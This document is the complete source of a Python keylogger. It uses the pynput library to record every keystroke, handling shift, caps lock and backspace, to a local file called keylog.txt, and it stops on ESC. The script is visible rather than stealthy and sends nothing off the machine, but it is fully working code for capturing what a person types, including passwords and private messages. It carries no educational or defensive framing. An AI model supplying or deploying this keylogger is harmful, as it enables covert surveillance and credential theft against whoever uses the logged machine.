from pynput import keyboard
import os

log_file = "keylog.txt"
caps_lock = False
shift_pressed = False

def write_to_file(text):
    """Writes text to log file and flushes immediately"""
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(text)
        f.flush()  # Force write immediately

def on_press(key):
    global caps_lock, shift_pressed
    try:
        if key == keyboard.Key.space:
            write_to_file(" ")
        elif key == keyboard.Key.enter:
            write_to_file("\n")
        elif key == keyboard.Key.backspace:
            with open(log_file, "r+", encoding="utf-8") as f:
                content = f.read()
                f.seek(0)
                f.write(content[:-1])  # Remove last character
                f.truncate()
        elif key == keyboard.Key.caps_lock:
            caps_lock = not caps_lock
        elif key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            shift_pressed = True
        elif hasattr(key, 'char') and key.char is not None:
            char = key.char.upper() if caps_lock ^ shift_pressed else key.char
            write_to_file(char)
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False
    elif key in [keyboard.Key.shift, keyboard.Key.shift_r]:
        shift_pressed = False

if __name__ == "__main__":
    # Clear log file before starting
    if os.path.exists(log_file):
        open(log_file, "w", encoding="utf-8").close()
    print("Keylogger started. Press ESC to stop.")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
